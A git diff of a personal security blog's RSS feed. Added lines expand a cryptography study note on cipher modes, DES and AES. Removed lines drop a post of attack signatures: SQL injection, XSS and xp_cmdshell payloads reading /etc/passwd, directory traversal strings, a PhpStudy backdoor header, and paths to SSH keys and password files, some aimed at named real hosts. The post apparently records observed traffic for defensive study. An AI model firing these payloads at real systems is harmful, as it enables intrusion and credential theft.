+&lt;h3 id=&quot;DES&quot;&gt;&lt;a href=&quot;#DES&quot; class=&quot;headerlink&quot; title=&quot;DES&quot;&gt;&lt;/a&gt;DES&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;Steps&lt;/th&gt;
+&lt;th&gt;Changes&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;Expansion Permutation&lt;/td&gt;
+&lt;td&gt;$R_i$  is expanded by using the expansion permutation,&lt;/td&gt;
+&lt;td&gt;32-&amp;gt;48&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Key mixing&lt;/td&gt;
+&lt;td&gt;$R_i=R_i\bigoplus{Subkey_i}$&lt;/td&gt;
+&lt;td&gt;48&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;S-box Substitution&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1.&lt;/code&gt; $R_i$ is divided into eight &lt;strong&gt;6-bit pieces&lt;/strong&gt; before processing by the S-boxes &lt;code&gt;2.&lt;/code&gt; 8个S-boxes中的每一个都根据一个非线性转换，&lt;strong&gt;以查找表的形式&lt;/strong&gt;，将其6个输入位替换为4个输出位&lt;/td&gt;
+&lt;td&gt;48-&amp;gt;32&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;P-box Permutation&lt;/td&gt;
+&lt;td&gt;根据&lt;strong&gt;映射规则表&lt;/strong&gt;，把输入的每位映射到新的输出位&lt;/td&gt;
+&lt;td&gt;32&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;XOR and Swap&lt;/td&gt;
+&lt;td&gt;$R_{i+1}=L_i\bigoplus{R_{i}}$&lt;/td&gt;
+&lt;td&gt;32&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Key schedule&lt;/td&gt;
+&lt;td&gt;PC1\PC2&lt;/td&gt;
+&lt;td&gt;64-&amp;gt;56-&amp;gt;48&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h3 id=&quot;AES&quot;&gt;&lt;a href=&quot;#AES&quot; class=&quot;headerlink&quot; title=&quot;AES&quot;&gt;&lt;/a&gt;AES&lt;/h3&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;Steps&lt;/th&gt;
+&lt;th&gt;length&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;SubBytes****&lt;/td&gt;
+&lt;td&gt;矩阵中各字节被固定的8位查找表中对应的特定字节所替换，输入的高4-bit对应的值作为行标，低4-bit对应的值作为列标，$S(b_{i,j})=S(a_{i,j})$&lt;/td&gt;
+&lt;td&gt;128&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;ShiftRows&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;矩阵中每一列的各个字节循环向左方位移，且位移量则随着列数递增而递增（第一行保持不变，第二行循环左移8比特，第三行循环左移16比特，第四行循环左移24比特）&lt;/td&gt;
+&lt;td&gt;128&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;MixColumns&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;linear transformation 矩阵乘法&lt;/td&gt;
+&lt;td&gt;128&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;AddRoundKey&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;$b_{i,j}=K_{i,j}\bigoplus{a_{i,j}}$&lt;/td&gt;
+&lt;td&gt;128&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Key expansion&lt;/td&gt;
+&lt;td&gt;若j%4=0,则w[j]=w[j-4]⊕g(w[j-1]),否则w[j]=w[j-4]⊕w[j-1]&lt;/td&gt;
+&lt;td&gt;128&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id=&quot;Assymetric-Algorithm&quot;&gt;&lt;a href=&quot;#Assymetric-Algorithm&quot; class=&quot;headerlink&quot; title=&quot;Assymetric Algorithm&quot;&gt;&lt;/a&gt;Assymetric Algorithm&lt;/h2&gt;&lt;h2 id=&quot;Hash&quot;&gt;&lt;a href=&quot;#Hash&quot; class=&quot;headerlink&quot; title=&quot;Hash&quot;&gt;&lt;/a&gt;Hash&lt;/h2&gt;</description>
       
       
       
-      <content:encoded><![CDATA[<h3 id="mode-of-operation"><a href="#mode-of-operation" class="headerlink" title="mode of operation"></a>mode of operation</h3><table><thead><tr><th></th><th></th><th></th><th>Workflow</th><th>Advantages</th><th>Limitations</th></tr></thead><tbody><tr><td>ECB</td><td>Electronic Codebook</td><td>电码本</td><td>$C_i=E_k(M_i)$</td><td>简单、主要用于少量分组的传输。<strong>没有明密文错误传播</strong></td><td>当明文分组重复时，密文也重复，易实现<strong>统计分析</strong>攻击</td></tr><tr><td>CBC</td><td>Cipher block chaining</td><td>密文分组链接</td><td>$C_i=E_k(M_i \bigoplus{C_{i-1}})$ $C_0=IV$</td><td>CBC没有明文错误传播，密文错误传播小</td><td>需要初始化和保护IV（原因），前面的分组会对后面的产生影响</td></tr><tr><td>CFB</td><td>Ciphertex feedback</td><td>密文反馈</td><td>$C_i=M_i \bigoplus{E_k(C_{i-1}})$ $C_0=IV$</td><td>可作为随机数生成器</td><td>在错误发生后，错误会在几个区块内传播（但不是无限期地传播）。</td></tr><tr><td>OFB</td><td>Output feedback</td><td>输出反馈</td><td>$O_i=E_k(O_{i-1})$ $C_i=M_i\bigoplus O_{i-1}$ $O_0=IV$</td><td>可作为随机数生成器，密文1bit错误只会导致对应的1bit出错</td><td>接收者和发送者必须保持同步</td></tr><tr><td>CTR</td><td>Galois/Counter</td><td>计数器</td><td>$O_i=E_k(i)$ $C_i=M_i\bigoplus O_{i-1}$</td><td>速度快</td><td>对每一分组必须用不同的$K$和计数$i$</td></tr><tr><td>AES-XTS</td><td>-</td><td>-</td><td>$T$ is tweak, $H$ is a hash function $C=H(T)\bigoplus{E(K,H(T)\bigoplus{M})}$</td><td>高效</td><td></td></tr></tbody></table><h3 id="symmetric-algorithm"><a href="#symmetric-algorithm" class="headerlink" title="symmetric algorithm"></a>symmetric algorithm</h3><table><thead><tr><th></th><th>DES</th><th>AES</th><th>3DES</th><th>RC4</th></tr></thead><tbody><tr><td>Basic</td><td>In DES the data block is divided into <strong>two halves</strong>.</td><td>In AES the entire data block is processed <strong>as a single matrix</strong>.</td><td>EEE/EDE</td><td>RC4生成一个伪随机的比特流（一个密钥流）。这些比特流可以通过与明文比特<strong>异或</strong>来进行加密</td></tr><tr><td>Principle</td><td>DES work on <strong>Feistel</strong> Cipher structure.</td><td>AES works on <strong>Substitution and Permutation</strong> Principle.</td><td>-</td><td>PRNG</td></tr><tr><td>Plaintext</td><td>明文按64位进行分组</td><td>Plaintext can be of 128,192, or 256 bits</td><td>-</td><td>以每一个字节为单位</td></tr><tr><td>Key size</td><td>密钥长64位，有效密钥长度56（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1</td><td>密钥长度则可以是128，192或256比特</td><td>3个独立密钥的3DES（密钥选项1）的有效密钥长度为<strong>168</strong>位（56x3），但由于中途相遇攻击，它的有效安全性仅为112位</td><td>40–2048 bits</td></tr><tr><td>Rounds</td><td>16 rounds</td><td>10 rounds for 128-bit algo<br><br>12 rounds for 192-bit algo<br><br>14 rounds for 256-bit algo</td><td>-</td><td>1</td></tr><tr><td>Rounds Names</td><td>Expansion Permutation, Xor, S-box, P-box, Xor and Swap.</td><td>Subbytes, Shiftrows, Mix columns, Addroundkeys.</td><td>-</td><td>-</td></tr><tr><td>Security</td><td>DES has a smaller key which is less secure.</td><td>AES has large secret key comparatively hence, more secure.</td><td>-</td><td>-</td></tr><tr><td>Speed</td><td>DES is comparatively slower.</td><td>AES is faster.</td><td>慢中慢</td><td>7 cycles per byte on original Pentium</td></tr></tbody></table><h3 id="assymetric-algorithm"><a href="#assymetric-algorithm" class="headerlink" title="assymetric algorithm"></a>assymetric algorithm</h3><h3 id="hash-funtion"><a href="#hash-funtion" class="headerlink" title="hash funtion"></a>hash funtion</h3><h3 id="digital-signature"><a href="#digital-signature" class="headerlink" title="digital signature"></a>digital signature</h3><h3 id="key-distribution"><a href="#key-distribution" class="headerlink" title="key distribution"></a>key distribution</h3><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3>]]></content:encoded>
+      <content:encoded><![CDATA[<h2 id="mode-of-operation"><a href="#mode-of-operation" class="headerlink" title="mode of operation"></a>mode of operation</h2><table><thead><tr><th></th><th></th><th></th><th>Workflow</th><th>Advantages</th><th>Limitations</th></tr></thead><tbody><tr><td>ECB</td><td>Electronic Codebook</td><td>电码本</td><td>$C_i=E_k(M_i)$</td><td>简单、主要用于少量分组的传输。<strong>没有明密文错误传播</strong></td><td>当明文分组重复时，密文也重复，易实现<strong>统计分析</strong>攻击</td></tr><tr><td>CBC</td><td>Cipher block chaining</td><td>密文分组链接</td><td>$C_i=E_k(M_i \bigoplus{C_{i-1}})$<br> $C_0=IV$</td><td>CBC没有明文错误传播，密文错误传播小</td><td>需要初始化和保护IV（原因），前面的分组会对后面的产生影响</td></tr><tr><td>CFB</td><td>Ciphertex feedback</td><td>密文反馈</td><td>$C_i=M_i \bigoplus{E_k(C_{i-1}})$<br> $C_0=IV$</td><td>可作为随机数生成器</td><td>在错误发生后，错误会在几个区块内传播（但不是无限期地传播）。</td></tr><tr><td>OFB</td><td>Output feedback</td><td>输出反馈</td><td>$O_i=E_k(O_{i-1})$<br> $C_i=M_i\bigoplus O_{i-1}$<br> $O_0=IV$</td><td>可作为随机数生成器，密文1bit错误只会导致对应的1bit出错</td><td>接收者和发送者必须保持同步</td></tr><tr><td>CTR</td><td>Galois/Counter</td><td>计数器</td><td>$O_i=E_k(i)$<br> $C_i=M_i\bigoplus O_{i-1}$</td><td>速度快</td><td>对每一分组必须用不同的$K$和计数$i$</td></tr><tr><td>AES-XTS</td><td>-</td><td>-</td><td>$T$ is tweak, $H$ is a hash function<br> $C=H(T)\bigoplus{E(K,H(T)\bigoplus{M})}$</td><td>高效</td><td></td></tr></tbody></table><h2 id="Symmetric-Algorithm"><a href="#Symmetric-Algorithm" class="headerlink" title="Symmetric Algorithm"></a>Symmetric Algorithm</h2><table><thead><tr><th></th><th>DES</th><th>AES</th><th>3DES</th><th>RC4</th></tr></thead><tbody><tr><td>Basic</td><td>In DES the data block is divided into <strong>two halves</strong>.</td><td>In AES the entire data block is processed <strong>as a single matrix</strong>.</td><td>EEE/EDE</td><td>RC4生成一个伪随机的比特流（一个密钥流）。这些比特流可以通过与明文比特<strong>异或</strong>来进行加密</td></tr><tr><td>Principle</td><td>DES work on <strong>Feistel</strong> Cipher structure.</td><td>AES works on <strong>Substitution and Permutation</strong> Principle.</td><td>-</td><td>PRNG</td></tr><tr><td>Plaintext</td><td>明文按64位进行分组，以<strong>比特</strong>为单位</td><td>Plaintext can be of 128,192, or 256，以<strong>字节</strong>为单位 bits</td><td>-</td><td>以<strong>字节</strong>为单位</td></tr><tr><td>Key size</td><td>密钥长64位，有效密钥长度56（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1</td><td>密钥长度则可以是128，192或256比特</td><td>EEE的有效密钥长度为<strong>168</strong>位（56x3），但由于中途相遇攻击，它的有效安全性仅为112位</td><td>40–2048 bits</td></tr><tr><td>Rounds</td><td>16 rounds</td><td>10 rounds for 128-bit algo<br><br>12 rounds for 192-bit algo<br><br>14 rounds for 256-bit algo</td><td>-</td><td>1</td></tr><tr><td>Rounds Names</td><td>Expansion Permutation, Xor, S-box, P-box, Xor and Swap.</td><td>Subbytes, Shiftrows, Mix columns, Addroundkeys.</td><td>-</td><td>-</td></tr><tr><td>Security</td><td><strong><code>1.</code></strong> S盒提供了DES的核心安全性—如果没有S盒，密码会是线性的，很容易破解 <strong><code>2.</code></strong> S盒，P置换和E扩张各自满足了混淆扩散原则 <code>3.</code> Avalanche Effect <code>4.</code> Timing Attacks &amp;&amp; Cryptanalysis</td><td><code>1.</code> SubBytes提供了非线性代换保证安全性</td><td>-</td><td>RC4安全性主要取决于于初始密钥的保密性</td></tr><tr><td>Speed</td><td>DES is comparatively slower.</td><td>AES is faster.</td><td>慢中慢</td><td>7 cycles per byte on original Pentium</td></tr></tbody></table><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><table><thead><tr><th></th><th>Steps</th><th>Changes</th></tr></thead><tbody><tr><td>Expansion Permutation</td><td>$R_i$  is expanded by using the expansion permutation,</td><td>32-&gt;48</td></tr><tr><td>Key mixing</td><td>$R_i=R_i\bigoplus{Subkey_i}$</td><td>48</td></tr><tr><td>S-box Substitution</td><td><code>1.</code> $R_i$ is divided into eight <strong>6-bit pieces</strong> before processing by the S-boxes <code>2.</code> 8个S-boxes中的每一个都根据一个非线性转换，<strong>以查找表的形式</strong>，将其6个输入位替换为4个输出位</td><td>48-&gt;32</td></tr><tr><td>P-box Permutation</td><td>根据<strong>映射规则表</strong>，把输入的每位映射到新的输出位</td><td>32</td></tr><tr><td>XOR and Swap</td><td>$R_{i+1}=L_i\bigoplus{R_{i}}$</td><td>32</td></tr><tr><td>Key schedule</td><td>PC1\PC2</td><td>64-&gt;56-&gt;48</td></tr></tbody></table><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><table><thead><tr><th></th><th>Steps</th><th>length</th></tr></thead><tbody><tr><td>SubBytes****</td><td>矩阵中各字节被固定的8位查找表中对应的特定字节所替换，输入的高4-bit对应的值作为行标，低4-bit对应的值作为列标，$S(b_{i,j})=S(a_{i,j})$</td><td>128</td></tr><tr><td><strong>ShiftRows</strong></td><td>矩阵中每一列的各个字节循环向左方位移，且位移量则随着列数递增而递增（第一行保持不变，第二行循环左移8比特，第三行循环左移16比特，第四行循环左移24比特）</td><td>128</td></tr><tr><td><strong>MixColumns</strong></td><td>linear transformation 矩阵乘法</td><td>128</td></tr><tr><td><strong>AddRoundKey</strong></td><td>$b_{i,j}=K_{i,j}\bigoplus{a_{i,j}}$</td><td>128</td></tr><tr><td>Key expansion</td><td>若j%4=0,则w[j]=w[j-4]⊕g(w[j-1]),否则w[j]=w[j-4]⊕w[j-1]</td><td>128</td></tr></tbody></table><h2 id="Assymetric-Algorithm"><a href="#Assymetric-Algorithm" class="headerlink" title="Assymetric Algorithm"></a>Assymetric Algorithm</h2><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><h2 id="digital-signature"><a href="#digital-signature" class="headerlink" title="digital signature"></a>digital signature</h2><h2 id="key-distribution"><a href="#key-distribution" class="headerlink" title="key distribution"></a>key distribution</h2><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2>]]></content:encoded>
       
       
       <category domain="https://hejueyun.github.io/categories/Security/">Security</category>
@@ -1052,41 +1192,6 @@
       
       
       <comments>https://hejueyun.github.io/posts/b0ab0f7f/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>信安小知识-6</title>
-      <link>https://hejueyun.github.io/posts/f11654a/</link>
-      <guid>https://hejueyun.github.io/posts/f11654a/</guid>
-      <pubDate>Tue, 12 Oct 2021 19:31:32 GMT</pubDate>
-      
-      <description>&lt;h2 id=&quot;Sqlmap-space2blank-Tamper-特殊空字符&quot;&gt;&lt;a href=&quot;#Sqlmap-space2blank-Tamper-特殊空字符&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap space2blank Tamper(特殊空字符)&quot;&gt;&lt;/a&gt;Sqlmap space2blank Tamper(特殊空字符)&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Location: https://www.mct.gov.cn/this_is_404_page?waf_detect=value+AND+1=1+UNION+ALL+SELECT+1,NULL,&amp;#x27;&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;&amp;#x27;,table_name+FROM+information_schema.tables+WHERE+2&amp;gt;1--/**/;+EXEC+xp_cmdshell(&amp;#x27;cat+../../../etc/passwd&amp;#x27;)#\&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h2 id=&quot;GIT项目源代码探测&quot;&gt;&lt;a href=&quot;#GIT项目源代码探测&quot; class=&quot;headerlink&quot; title=&quot;GIT项目源代码探测&quot;&gt;&lt;/a&gt;GIT项目源代码探测&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://www.caeg.cn/.git/HEAD&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h2 id=&quot;目录穿越攻击行为&quot;&gt;&lt;a href=&quot;#目录穿越攻击行为&quot; class=&quot;headerlink&quot; title=&quot;目录穿越攻击行为&quot;&gt;&lt;/a&gt;目录穿越攻击行为&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;temp=/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.shtml/../../xhtml/css/index.css&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[%2F  ==  /]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h2 id=&quot;Nmap扫描&quot;&gt;&lt;a href=&quot;#Nmap扫描&quot; class=&quot;headerlink&quot; title=&quot;Nmap扫描&quot;&gt;&lt;/a&gt;Nmap扫描&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/nice ports,/Trinity.txt.bak&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h2 id=&quot;PhpStudy后门远程命令执行&quot;&gt;&lt;a href=&quot;#PhpStudy后门远程命令执行&quot; class=&quot;headerlink&quot; title=&quot;PhpStudy后门远程命令执行&quot;&gt;&lt;/a&gt;PhpStudy后门远程命令执行&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Accept-Charset: ZGllKG1kNSgnSGVsbG9waHBTdHVkeScpKTs=&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;die(md5(&amp;#x27;HellophpStudy&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="Sqlmap-space2blank-Tamper-特殊空字符"><a href="#Sqlmap-space2blank-Tamper-特殊空字符" class="headerlink" title="Sqlmap space2blank Tamper(特殊空字符)"></a>Sqlmap space2blank Tamper(特殊空字符)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: https://www.mct.gov.cn/this_is_404_page?waf_detect=value+AND+1=1+UNION+ALL+SELECT+1,NULL,&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;,table_name+FROM+information_schema.tables+WHERE+2&gt;1--/**/;+EXEC+xp_cmdshell(&#x27;cat+../../../etc/passwd&#x27;)#\</span><br></pre></td></tr></table></figure><h2 id="GIT项目源代码探测"><a href="#GIT项目源代码探测" class="headerlink" title="GIT项目源代码探测"></a>GIT项目源代码探测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.caeg.cn/.git/HEAD</span><br></pre></td></tr></table></figure><h2 id="目录穿越攻击行为"><a href="#目录穿越攻击行为" class="headerlink" title="目录穿越攻击行为"></a>目录穿越攻击行为</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">temp=/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows/</span><br><span class="line">.shtml/../../xhtml/css/index.css</span><br><span class="line"></span><br><span class="line">[%2F  ==  /]</span><br></pre></td></tr></table></figure><h2 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/nice ports,/Trinity.txt.bak</span><br></pre></td></tr></table></figure><h2 id="PhpStudy后门远程命令执行"><a href="#PhpStudy后门远程命令执行" class="headerlink" title="PhpStudy后门远程命令执行"></a>PhpStudy后门远程命令执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset: ZGllKG1kNSgnSGVsbG9waHBTdHVkeScpKTs=</span><br><span class="line"></span><br><span class="line">die(md5(&#x27;HellophpStudy&#x27;));</span><br></pre></td></tr></table></figure><h2 id="Whatweb扫描行为"><a href="#Whatweb扫描行为" class="headerlink" title="Whatweb扫描行为"></a>Whatweb扫描行为</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: WhatWeb/0.5.2</span><br></pre></td></tr></table></figure><h2 id="系统-服务配置不当"><a href="#系统-服务配置不当" class="headerlink" title="系统/服务配置不当"></a>系统/服务配置不当</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、如果必须开启该目录的目录列表功能，则应对该目录下的文件进行详细检查，确保不包含敏感文件。2、如非必要，请重新配置WEB服务器，禁止该目录的自动目录列表功能。附：1.Apache禁止列目录：方法一，修改httpd.conf配置文件，查找OptionsIndexesFollowSymLinks，修改为Options-Indexes；方法二，在www目录下的修改.htaccess配置文件，加入Options-Indexes。（推荐）2.Tomcat禁止列目录：在Tomcat的conf/web.xml文件里把listings值改为false。PS：修改完httpd.conf后，一定记得重启web服务，才能生效噢！1.IIS禁止列目录方法一，在网站目录上右键点“属性”然后找到“主目录”，将“目录浏览”前的勾去掉即可，如下图方法二，若要启用或禁用目录浏览，请使用下面的语法：appcmdsetconfig/section:directoryBrowse/enabled:true|false默认情况下，enabled属性设置为true，这表示目录浏览已启用。将enabled属性设置为false时，就会禁用目录浏览。例如，若要禁用目录浏览，请在命令提示符处键入如下命令，然后按Enter：appcmdsetconfig/section:directoryBrowse/enabled:false</span><br></pre></td></tr></table></figure><h2 id="Apache-Shiro-lt-1-2-4反序列化漏洞攻击-CVE-2016-4437"><a href="#Apache-Shiro-lt-1-2-4反序列化漏洞攻击-CVE-2016-4437" class="headerlink" title="Apache Shiro &lt;= 1.2.4反序列化漏洞攻击(CVE-2016-4437)"></a>Apache Shiro &lt;= 1.2.4反序列化漏洞攻击(CVE-2016-4437)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常情况下，远程代码执行漏洞包括： （1）URL提交，主要是GET、POST请求； （2）构造特定的HTTP请求； （3）利用一些框架底层的安全漏洞，执行任意代码； 远程代码执行漏洞可带来如下危害： （1）攻击者可通过此漏洞创建恶意脚本文件，对服务器的正常运行造成安全威胁； （2）黑客可在服务器上执行任意脚本命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</span><br></pre></td></tr></table></figure><h2 id="WebServer文件解析漏洞攻击"><a href="#WebServer文件解析漏洞攻击" class="headerlink" title="WebServer文件解析漏洞攻击"></a>WebServer文件解析漏洞攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebServer在处理请求中asp扩展名时，通过上传asp代码的图片文件访问xxx.asp;x.jpg来执行其中的代码;</span><br></pre></td></tr></table></figure><h2 id="信息泄露攻击"><a href="#信息泄露攻击" class="headerlink" title="信息泄露攻击"></a>信息泄露攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">db.sql</span><br><span class="line"></span><br><span class="line">db.sqlite</span><br><span class="line"></span><br><span class="line">config.php.bak</span><br><span class="line"></span><br><span class="line">config.ini</span><br><span class="line"></span><br><span class="line">config.inc </span><br><span class="line"></span><br><span class="line">id_rsa</span><br><span class="line"></span><br><span class="line">phpinfo.php</span><br><span class="line"></span><br><span class="line">.bash_profile</span><br><span class="line"></span><br><span class="line">.htpasswd.bak</span><br><span class="line"></span><br><span class="line">.user.ini</span><br><span class="line"></span><br><span class="line">.svn/entries</span><br><span class="line"></span><br><span class="line">.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">/../../../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><h2 id="文件下载过滤"><a href="#文件下载过滤" class="headerlink" title="文件下载过滤"></a>文件下载过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">114.255.59.102/api.php?c=project&amp;f=index&amp;id=news&amp;sort=1+and+extractvalue(1,concat(~,md5(915401131)))+--+&amp;token=1234</span><br><span class="line"></span><br><span class="line">GET /vpn/../vpns/cfg/smb.conf</span><br></pre></td></tr></table></figure><h2 id="Apache畸形本地文件名安全绕过漏洞"><a href="#Apache畸形本地文件名安全绕过漏洞" class="headerlink" title="Apache畸形本地文件名安全绕过漏洞"></a>Apache畸形本地文件名安全绕过漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache服务器从右至左判断文件后缀名，假如文件名为filename.x1.x2.x3，则先判断x3是否文件后缀名，然后x2，x1直到发现有效后缀名。这导致像test.php.x1.x2.x3这样的文件被识别为test.php，即，攻击者创建类似于*.php.*，的文件名，上传至服务器即可利用该漏洞运行脚本</span><br></pre></td></tr></table></figure><h2 id="Apache-Tomcat-AllowLinking-URIencoding目录遍历漏洞"><a href="#Apache-Tomcat-AllowLinking-URIencoding目录遍历漏洞" class="headerlink" title="Apache Tomcat AllowLinking URIencoding目录遍历漏洞"></a>Apache Tomcat AllowLinking URIencoding目录遍历漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 